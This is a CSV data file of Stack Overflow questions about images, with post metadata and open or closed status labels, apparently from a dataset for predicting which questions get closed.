PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
9701623,03/14/2012 12:04:54,762730,05/20/2011 12:31:29,122,1,Animated images for applications,"I would like to get some good quality FREE animated gif images for my application. An example of that would be a hovering magnifying glass which indicates that my application is searching for something in the database. Any ideas on where I should look for these?

I have been googling/binging for these since long.. but never came across something attractive.. :(",image,free,animated-gif,online-resources,,,open,0,60,4,"Animated images for applications I would like to get some good quality FREE animated gif images for my application. An example of that would be a hovering magnifying glass which indicates that my application is searching for something in the database. Any ideas on where I should look for these?

I have been googling/binging for these since long.. but never came across something attractive.. :(",4
7768599,10/14/2011 13:48:43,416319,08/10/2010 15:26:48,3,0,Hotlink redirection,"I have this URL: **www.example.com/yyy.gif** at my site.
It is actually NOT a direct link to the image  but a HTML page conatining the image (direct url to said image is www.example.com/files/yyy.gif). I want to keep it that way.

**THE PROBLEM**

When the link (www.example.com/yyy.gif) is posted somewhere (forums, comments at various websites) it is quite common that their script assumes it is a direct link to an image and tries to display it as an image (`<image src=""www.example.com/yyy.gif"">`) which leads to broken image on their site.

**THE QUESTION**

Is there a way to detect these cases and automatically reroute them to the direct image URL? Keep in mind that visitors should be able to open the original URL without being redirected.",image,.htaccess,mod-rewrite,url-rewriting,url-routing,,open,0,118,2,"Hotlink redirection I have this URL: **www.example.com/yyy.gif** at my site.
It is actually NOT a direct link to the image  but a HTML page conatining the image (direct url to said image is www.example.com/files/yyy.gif). I want to keep it that way.

**THE PROBLEM**

When the link (www.example.com/yyy.gif) is posted somewhere (forums, comments at various websites) it is quite common that their script assumes it is a direct link to an image and tries to display it as an image (`<image src=""www.example.com/yyy.gif"">`) which leads to broken image on their site.

**THE QUESTION**

Is there a way to detect these cases and automatically reroute them to the direct image URL? Keep in mind that visitors should be able to open the original URL without being redirected.",5
9809069,03/21/2012 16:43:39,1202683,02/10/2012 18:22:20,7,0,"how to make "".des"" files from "".png"" files?",i have been asking this question for along while but didnt get a reply till yet.I want to make **.des** file form **.png** file.**DES** files tell us where the small image is in the big atlas image.Basically i just a atlas(textures) making process/script/module or anything that takes .png file and return **.des** file.That is take **PNG** as input and return **DES** at output.I have tried softwares like coreldraw and other that support DES extension but all in vain.I hope to hear some good reply and not get marked my question as off topic. ,image,image-processing,png,texture-mapping,atlassprites,07/06/2012 22:14:15,off topic,1,94,8,"how to make "".des"" files from "".png"" files? i have been asking this question for along while but didnt get a reply till yet.I want to make **.des** file form **.png** file.**DES** files tell us where the small image is in the big atlas image.Basically i just a atlas(textures) making process/script/module or anything that takes .png file and return **.des** file.That is take **PNG** as input and return **DES** at output.I have tried softwares like coreldraw and other that support DES extension but all in vain.I hope to hear some good reply and not get marked my question as off topic. ",5
9675941,03/12/2012 22:53:00,1265247,03/12/2012 22:31:47,1,0,Virus in image?,"I have recently watched  [this][1] video of a Finnish internet security expert. Somewhere around eleventh minute, he talks about a virus which is hidden in an image and executes when the image is about to be displayed.

I am wondering how do they technically do such a thing, I mean how come the **virus** is **executed**, when the picture should be **displayed** and how come the picture is not compromised in some way. I thought the computer first looks at the extension, then opens it with appropriate program and lets the program work itself (and I don't expect regular image viewer to be able to run a virus within itself). Obviously it doesn't work like that, but no one I asked could help me out with this.

So does anyone know how do they do this, the principle? Thank you very much.


  [1]: http://www.ted.com/talks/mikko_hypponen_fighting_viruses_defending_the_net.html",image,security,virus,,,,open,0,144,3,"Virus in image? I have recently watched  [this][1] video of a Finnish internet security expert. Somewhere around eleventh minute, he talks about a virus which is hidden in an image and executes when the image is about to be displayed.

I am wondering how do they technically do such a thing, I mean how come the **virus** is **executed**, when the picture should be **displayed** and how come the picture is not compromised in some way. I thought the computer first looks at the extension, then opens it with appropriate program and lets the program work itself (and I don't expect regular image viewer to be able to run a virus within itself). Obviously it doesn't work like that, but no one I asked could help me out with this.

So does anyone know how do they do this, the principle? Thank you very much.


  [1]: http://www.ted.com/talks/mikko_hypponen_fighting_viruses_defending_the_net.html",3
4849773,01/31/2011 10:24:12,1034,08/11/2008 16:29:38,1509,29,Looking for the right image file format and library,"In our current project, we are running into memory problems since we need to load too many image files. The current system is loading plain uncompressed Microsoft BMP files, so this is the obvious problem.

So, we are looking for a file format that

* is fast to parse (must run on an embedded Linux system)  
* can read some part of the image without decoding the whole file
* uses lossless compression (no 8-bit color tables, please)
* includes a full alpha channel (not just a bitmask as in GIF)
* compiles and runs on Linux and Windows
* can be used in a commercial application (LGPL is fine)
* can be exported to using Photoshop

My first guess was PNG, but I am not sure if I can parse part of an image without decoding the whole file. Do you have any better idea or some experiences to share?",image,embedded,png,compatibility,file-format,,open,0,144,9,"Looking for the right image file format and library In our current project, we are running into memory problems since we need to load too many image files. The current system is loading plain uncompressed Microsoft BMP files, so this is the obvious problem.

So, we are looking for a file format that

* is fast to parse (must run on an embedded Linux system)  
* can read some part of the image without decoding the whole file
* uses lossless compression (no 8-bit color tables, please)
* includes a full alpha channel (not just a bitmask as in GIF)
* compiles and runs on Linux and Windows
* can be used in a commercial application (LGPL is fine)
* can be exported to using Photoshop

My first guess was PNG, but I am not sure if I can parse part of an image without decoding the whole file. Do you have any better idea or some experiences to share?",5
9181086,02/07/2012 17:42:17,200015,10/31/2009 01:59:51,2238,53,Why won't the images show in my WP7 App?,"Common image questions in regards to developing WP7 applications which are all related to the same issue of Build Action.

 - Why won't my images show in my WP7 app?
 - Why aren't the Application Icon buttons showing in my WP7 app?
 - Why aren't the images showing up in my *CONTROL-NAME* control?
 - Which path do I use to show my images, in examples I see two different ways?
 - What is the difference between Content and Resource in Build Action property?
 - What is ""Build Action""?


**Side Note** I've been seeing these questions (or question) over, and over again. When you start seeing it every 4 or 5 questions, I think there's something wrong. Perhaps someone could turn this into a Community Wiki so we can keep future WP7 questions relevant and more unique?

Thanks.",image,windows-phone-7,windows-phone-7.1,windows-phone-7.5,windows-phone,02/18/2012 03:36:26,not constructive,1,135,9,"Why won't the images show in my WP7 App? Common image questions in regards to developing WP7 applications which are all related to the same issue of Build Action.

 - Why won't my images show in my WP7 app?
 - Why aren't the Application Icon buttons showing in my WP7 app?
 - Why aren't the images showing up in my *CONTROL-NAME* control?
 - Which path do I use to show my images, in examples I see two different ways?
 - What is the difference between Content and Resource in Build Action property?
 - What is ""Build Action""?


**Side Note** I've been seeing these questions (or question) over, and over again. When you start seeing it every 4 or 5 questions, I think there's something wrong. Perhaps someone could turn this into a Community Wiki so we can keep future WP7 questions relevant and more unique?

Thanks.",5
5577611,04/07/2011 07:43:55,631915,02/24/2011 08:04:31,28,0,Remove watermark imagemagick,"How can i remove the watermark of images...
",image,magic,,,,04/07/2011 11:29:27,off topic,1,8,3,"Remove watermark imagemagick How can i remove the watermark of images...
",2
5482028,03/30/2011 04:57:27,139150,07/16/2009 03:00:08,1056,56,Changing the image upside down,"The following favicon.ico file has ""W"" in it. I want it change the direction upside down. It will look like ""M"" and the file format will be the same.

http://en.wikipedia.org/favicon.ico

How is it done?
",image,image-processing,photoshop,,,03/30/2011 13:36:40,off topic,1,32,5,"Changing the image upside down The following favicon.ico file has ""W"" in it. I want it change the direction upside down. It will look like ""M"" and the file format will be the same.

http://en.wikipedia.org/favicon.ico

How is it done?
",3
6702423,07/15/2011 03:35:19,828688,07/04/2011 20:18:32,1,0,Convert image and audio files to binary in Java,"I searched a lot online for this but couldn't find any good source of information. I want to convert an image and an audio file into a binary stream, process it and then reconstruct the image from the same binary stream in Java. How can I do that? Has anybody worked on this? Please help me out as soon as possible. Any hints or pseudocode will be highly appreciated. Thanks, 
-Anagha. ",image,binary,processing,,,,open,0,72,9,"Convert image and audio files to binary in Java I searched a lot online for this but couldn't find any good source of information. I want to convert an image and an audio file into a binary stream, process it and then reconstruct the image from the same binary stream in Java. How can I do that? Has anybody worked on this? Please help me out as soon as possible. Any hints or pseudocode will be highly appreciated. Thanks, 
-Anagha. ",3
11741693,07/31/2012 13:50:17,1415313,05/24/2012 14:37:05,6,0,Use google image charts to export image to excel?,"I building a web application with grails and am using the jxl api to generate an excel file to allow formatting.  I would like to generate a chart using data in my application to include with the excel file.

The only source I have found to create a static image that could be saved and then inserted into the excel file is the deprecated Google image charts api to build a URL string to retrieve the corresponding chart.

1.  Should I be concerned about doing this with the deprecated google image charts, or should I be fine, given that I am only using of the pie chart type

2.  Should I be going about this entirely differently?  Using the browser to save the image could be problematic because the app needs to support ie. 7-9.

Thanks",image,google,grails,charts,,,open,0,136,9,"Use google image charts to export image to excel? I building a web application with grails and am using the jxl api to generate an excel file to allow formatting.  I would like to generate a chart using data in my application to include with the excel file.

The only source I have found to create a static image that could be saved and then inserted into the excel file is the deprecated Google image charts api to build a URL string to retrieve the corresponding chart.

1.  Should I be concerned about doing this with the deprecated google image charts, or should I be fine, given that I am only using of the pie chart type

2.  Should I be going about this entirely differently?  Using the browser to save the image could be problematic because the app needs to support ie. 7-9.

Thanks",4
10496769,05/08/2012 10:22:35,1248870,03/05/2012 01:29:29,80,2,How do make a smaller tiled image from a large background?,I have this larger image: http://imgur.com/henxc that I need to create a smaller tile of to repeat as a background. However I'm having difficulty knowing what part I need to crop. Can someone please explain how to make this into a small piece that will tile? Is there a technique in Photoshop to make this easier maybe?,image,graphics,photoshop,,,05/10/2012 21:08:18,off topic,1,57,11,How do make a smaller tiled image from a large background? I have this larger image: http://imgur.com/henxc that I need to create a smaller tile of to repeat as a background. However I'm having difficulty knowing what part I need to crop. Can someone please explain how to make this into a small piece that will tile? Is there a technique in Photoshop to make this easier maybe?,3
3666692,09/08/2010 10:19:32,348168,05/23/2010 07:28:50,30,0,Where can I find free icons for numbers 1-20,"I want an icon set containing numbers from 1 to 20.
Background should be white.On the top left corner number should be drawn.
Can I download free from a website.",image,icons,favicon,,,09/08/2010 19:09:58,off topic,1,28,9,"Where can I find free icons for numbers 1-20 I want an icon set containing numbers from 1 to 20.
Background should be white.On the top left corner number should be drawn.
Can I download free from a website.",3
7252298,08/31/2011 03:37:19,920898,08/31/2011 03:37:19,1,0,Wordpress Image URL is not working,"when I insert an image to a post on wordpress based blog, the page goes back to itself and not going to the external link is supposed to go to.

For example: I post an image to this page image http://www.2013movies.org/download-movies . When someone clicks on that image it supposed to go to the external link I specified but that's not happening. When clicked on the image it goes back to itself. 

Am I missing something? blog is http://www.2013movies.org",image,wordpress,movies,,,08/31/2011 03:49:20,off topic,1,78,6,"Wordpress Image URL is not working when I insert an image to a post on wordpress based blog, the page goes back to itself and not going to the external link is supposed to go to.

For example: I post an image to this page image http://www.2013movies.org/download-movies . When someone clicks on that image it supposed to go to the external link I specified but that's not happening. When clicked on the image it goes back to itself. 

Am I missing something? blog is http://www.2013movies.org",3
8554587,12/18/2011 20:31:49,1104899,12/18/2011 20:27:24,1,0,How to make a change picture script?,"I think it's a simple question. 

I need a Script which change picture  / content for example like the following (just a quick example I found):
http://www.bestbuy.com/

That by click the left links / images it change the content. Or, like in:
http://www.verizonwireless.com

That the links are down. 
Basically I'd like to do both - so I can control the content also from aside and from the bottom. 
Is there a free database for scripts where I can find a Script how to do that? 

Thanks!!  ",image,script,carousel,,,,open,0,85,7,"How to make a change picture script? I think it's a simple question. 

I need a Script which change picture  / content for example like the following (just a quick example I found):
http://www.bestbuy.com/

That by click the left links / images it change the content. Or, like in:
http://www.verizonwireless.com

That the links are down. 
Basically I'd like to do both - so I can control the content also from aside and from the bottom. 
Is there a free database for scripts where I can find a Script how to do that? 

Thanks!!  ",3
1820607,11/30/2009 15:47:22,221426,11/30/2009 15:47:22,1,0,image processing,"i want to do a final year B.Sc project on parking space detection.Can anybody give me some link related to it? any text-book, tutorial or anything ?? what would be prerequisite for this project? what type of skills(programming/math) are needed? what are the initial steps to do? what type of readings(algorithms of image processing) are needed?",image,processing,,,,09/07/2011 14:29:05,not a real question,1,56,2,"image processing i want to do a final year B.Sc project on parking space detection.Can anybody give me some link related to it? any text-book, tutorial or anything ?? what would be prerequisite for this project? what type of skills(programming/math) are needed? what are the initial steps to do? what type of readings(algorithms of image processing) are needed?",2
5439070,03/25/2011 23:14:11,677556,03/25/2011 23:12:27,1,0,weird problem With Images Components,"First Sorry for My bad English.


My problem is when i Open my old Project (Project that work by same Delphi Version), I Lost entire Image picture Contents, i mean picture Property is None.

when i open dfm with notepad, it's picture property have Data but when i open it with delphi, it's Picture Data will Disapear, it's seems that delphi recognize picture data Invalid.
(in this situation Delphi erase all Data).

this happen with all Image Components and all Components that have Picture Property

i encounter with this problem when i reinstall delphi.
My delphi Version is 2007.",image,delphi,,,,,open,0,93,5,"weird problem With Images Components First Sorry for My bad English.


My problem is when i Open my old Project (Project that work by same Delphi Version), I Lost entire Image picture Contents, i mean picture Property is None.

when i open dfm with notepad, it's picture property have Data but when i open it with delphi, it's Picture Data will Disapear, it's seems that delphi recognize picture data Invalid.
(in this situation Delphi erase all Data).

this happen with all Image Components and all Components that have Picture Property

i encounter with this problem when i reinstall delphi.
My delphi Version is 2007.",2
5638091,04/12/2011 15:52:13,660987,03/15/2011 16:26:30,13,0,Blackberry tiff images not shown,I have a blackberry curve 9300 and it does not display the tiff images just a red cross in the upper left corner. Is there a way to view them ? ,image,blackberry,tiff,,,04/13/2011 07:44:13,off topic,1,32,5,Blackberry tiff images not shown I have a blackberry curve 9300 and it does not display the tiff images just a red cross in the upper left corner. Is there a way to view them ? ,3
7657607,10/05/2011 06:44:28,390129,07/13/2010 05:44:22,151,0,"document.getElementsByTagName('img') , how to only get png images?","I am trying to only get images with the png attribute from the dom, does anyone know how to this?

Thanks in advance

Regards",image,dom,,,,,open,0,22,8,"document.getElementsByTagName('img') , how to only get png images? I am trying to only get images with the png attribute from the dom, does anyone know how to this?

Thanks in advance

Regards",2
11592976,07/21/2012 14:25:36,1533368,07/18/2012 01:45:09,1,0,Non Rectangular Images,"I am not sure if this question suits stackoverflow or not. But here it goes, I want to have an image strictly of the shape and size of the main object in the image, there should not be any white or black background, or the background should be transparent so that the real background should be visible. How can I do it? is it possible using photoshop? I want to use these images to create a slideshow in flash.",image,image-processing,,,,07/22/2012 21:54:24,not a real question,1,79,3,"Non Rectangular Images I am not sure if this question suits stackoverflow or not. But here it goes, I want to have an image strictly of the shape and size of the main object in the image, there should not be any white or black background, or the background should be transparent so that the real background should be visible. How can I do it? is it possible using photoshop? I want to use these images to create a slideshow in flash.",2
4321901,12/01/2010 06:50:19,526172,12/01/2010 06:50:19,1,0,How to get src of from image,"I have a text box with its value as &lt;img src=""http://localhost/wp/review/wp-content/uploads/2010/11/Sunset.jpg"" /&gt;

I have to replace this text box value to 'http://localhost/wp/review/wp-content/uploads/2010/11/Sunset.jpg' That is the main target is to remove img tag and keep only the src value.

Thanks
Ashok Negi",image,src,,,,,open,0,38,7,"How to get src of from image I have a text box with its value as &lt;img src=""http://localhost/wp/review/wp-content/uploads/2010/11/Sunset.jpg"" /&gt;

I have to replace this text box value to 'http://localhost/wp/review/wp-content/uploads/2010/11/Sunset.jpg' That is the main target is to remove img tag and keep only the src value.

Thanks
Ashok Negi",2
7530011,09/23/2011 13:50:03,172637,09/13/2009 00:11:44,4793,135,Editing an animated GIF,"I'd like to *edit* an *animated* gif to change its background from white to #f5f5f5:

![enter image description here][1]


  [1]: http://i.stack.imgur.com/3m34I.gif

Photoshop can import it and shows as layers, but saves only the first frame. Are there any editors, preferably online tools that allows it?

Many thanks for your help!",image,photoshop,editing,gif,,09/23/2011 14:57:00,off topic,1,48,4,"Editing an animated GIF I'd like to *edit* an *animated* gif to change its background from white to #f5f5f5:

![enter image description here][1]


  [1]: http://i.stack.imgur.com/3m34I.gif

Photoshop can import it and shows as layers, but saves only the first frame. Are there any editors, preferably online tools that allows it?

Many thanks for your help!",4
6411182,06/20/2011 12:32:20,309923,04/06/2010 10:21:37,188,4,Can I use credit card images in my payment page,"Can I use supported credit card images like VISA, MASTER in my payment page? Do I need to seek permission from them? Or it is free to use ? Please suggest..Thanks",image,types,payment,,,06/20/2011 13:02:39,off topic,1,31,10,"Can I use credit card images in my payment page Can I use supported credit card images like VISA, MASTER in my payment page? Do I need to seek permission from them? Or it is free to use ? Please suggest..Thanks",3
8341265,12/01/2011 12:17:39,908984,08/24/2011 06:03:26,8,0,apply color correction for multiple images in photoshop,"apply color correction for multiple images in Photoshop?

        
 I have edited a image in Photoshop by changing color, brightness and many things.
 Now i have to apply the same changes in another image.
 but i forgot the values which i have changed. 
Is there possible to copy the properties to another image?. if it does >please guide me.

give me some tutorial for this process..

thanks in advance,
GANESH M",image,colors,photoshop,adjustment,color-codes,12/02/2011 23:01:23,off topic,1,75,8,"apply color correction for multiple images in photoshop apply color correction for multiple images in Photoshop?

        
 I have edited a image in Photoshop by changing color, brightness and many things.
 Now i have to apply the same changes in another image.
 but i forgot the values which i have changed. 
Is there possible to copy the properties to another image?. if it does >please guide me.

give me some tutorial for this process..

thanks in advance,
GANESH M",5
5844186,04/30/2011 19:42:19,490337,10/28/2010 16:07:45,79,3,Is there website template software available?,"I've seen countless websites that have the most amazing layouts coupled with incredible graphics and imagery. 

**My question is this - is there software available that comes with graphics or website templates?** 

Just as an example, a site called ***http://www.dreamtemplate.com/***, where unfortunately you have to pay to be a member and/or purchase a website template at a large cost, has some really amazing site templates. I would like to be able to create similar designs.


**So how do they do it?** How are these amazing site created? Where are they getting the graphics?...I doubt they are manually creating them...right?

",image,templates,graphics,website,software,04/30/2011 20:06:36,off topic,1,98,6,"Is there website template software available? I've seen countless websites that have the most amazing layouts coupled with incredible graphics and imagery. 

**My question is this - is there software available that comes with graphics or website templates?** 

Just as an example, a site called ***http://www.dreamtemplate.com/***, where unfortunately you have to pay to be a member and/or purchase a website template at a large cost, has some really amazing site templates. I would like to be able to create similar designs.


**So how do they do it?** How are these amazing site created? Where are they getting the graphics?...I doubt they are manually creating them...right?

",5
8948600,01/20/2012 22:19:51,1161561,01/20/2012 22:09:15,1,0,Comparing Tag Images in matlab,"I have a .mat file that contain ten tags of pictures , i want to extract of a robust coefficients from multiple shots of the same tag. At the end of this tag to identify which picture has more resemblance to the other.

------------------
                   <---- first tag
------------------
                   <---- Second tag                   
------------------
                   <---- third tag
------------------
.
.
.
.
------------------
                   <---- tenths tag
------------------

These Tags are in the same .mat file , i need to compare each tag by all the ninth other. ",image,matlab,fft,discussion,,04/05/2012 15:55:17,not a real question,1,166,5,"Comparing Tag Images in matlab I have a .mat file that contain ten tags of pictures , i want to extract of a robust coefficients from multiple shots of the same tag. At the end of this tag to identify which picture has more resemblance to the other.

------------------
                   <---- first tag
------------------
                   <---- Second tag                   
------------------
                   <---- third tag
------------------
.
.
.
.
------------------
                   <---- tenths tag
------------------

These Tags are in the same .mat file , i need to compare each tag by all the ninth other. ",4
5683882,04/16/2011 01:33:40,106111,05/13/2009 08:59:24,581,4,How do I use animated picture in Facebook?,"It's possible to upload animation image on Facebook?

I found this **[picture][1]** is animation and I'm a bit confused. Why `jpg` can be animated?

Anybody can explain it. Let me know.


  [1]: http://photos-d.ak.fbcdn.net/hphotos-ak-snc3/27977_126383857373567_123901794288440_322191_439389_s.jpg",image,facebook,animation,picture,,11/13/2011 23:19:23,off topic,1,32,8,"How do I use animated picture in Facebook? It's possible to upload animation image on Facebook?

I found this **[picture][1]** is animation and I'm a bit confused. Why `jpg` can be animated?

Anybody can explain it. Let me know.


  [1]: http://photos-d.ak.fbcdn.net/hphotos-ak-snc3/27977_126383857373567_123901794288440_322191_439389_s.jpg",4
